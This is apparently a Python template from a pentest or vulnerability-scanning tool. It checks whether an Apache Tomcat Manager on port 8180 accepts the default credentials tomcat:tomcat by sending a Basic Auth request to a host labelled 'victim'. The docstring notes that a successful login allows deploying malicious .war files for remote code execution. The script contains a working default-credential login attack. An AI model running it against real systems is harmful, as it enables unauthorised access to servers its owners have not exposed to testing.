"""
ATTACK NAME: Apache Tomcat Default Credentials
PORT: 8180
CVE: CVE-1999-0502 (Generic Default Creds)

VULNERABILITY: The Tomcat Manager application is exposed and configured 
with default, easily guessable credentials (tomcat:tomcat).

HOW IT WORKS:
1. Connect to http://<target>:8180/manager/html via HTTP GET.
2. Provide an 'Authorization: Basic' header with the base64 encoded creds.
3. If the server responds with HTTP 200 OK, we are in. 
4. If it responds with HTTP 401 Unauthorized, it failed.

SECURITY IMPACT: High. Allows deployment of malicious .war files (RCE).
"""

import requests

def validate_evidence(validation_rule, result):
    if result is None: return False
    try:
        # We are checking status codes now, not regex strings!
        if validation_rule.get("type") == "status_code":
            return int(result) == int(validation_rule.get("expected"))
    except Exception as e:
        print(f"[!] Validation Error: {e}")
    return False

TARGET_IP = "victim"

# The "Template" Data
TEMPLATE = {
    "params": {
        "method": "GET",
        "port": 8180,
        "path": "/manager/html",
        "auth": ("tomcat", "tomcat"), # requests takes a tuple for Basic Auth
        "timeout": 5
    },
    "validation": {
        "type": "status_code",
        "expected": 200
    }
}

def run_test():
    print(f"[*] Attacking {TARGET_IP} on Port 8180 (Tomcat)...")
    raw_response_code = None
    
    # --- STEP 1: FIRE THE HTTP REQUEST ---
    try:
        url = f"http://{TARGET_IP}:{TEMPLATE['params']['port']}{TEMPLATE['params']['path']}"
        print(f"[*] Sending GET request to {url} with credentials...")
        
        # We use the requests library to handle the heavy lifting
        response = requests.request(
            method=TEMPLATE["params"]["method"],
            url=url,
            auth=TEMPLATE["params"]["auth"],
            timeout=TEMPLATE["params"]["timeout"]
        )
        
        raw_response_code = response.status_code
        print(f"[+] HTTP Status Code Received: {raw_response_code}")
        
    except requests.exceptions.RequestException as e:
        print(f"[!] HTTP Request Failed: {e}")
        return

    # --- STEP 2: VALIDATE ---
    print("[*] Running Validator...")
    is_success = validate_evidence(TEMPLATE["validation"], raw_response_code)
    
    if is_success:
        print("✅ VERDICT: VULNERABILITY CONFIRMED. Default credentials work.")
    else:
        print("❌ VERDICT: EXPLOIT FAILED. Received 401 Unauthorized or other error.")

if __name__ == "__main__":
    run_test()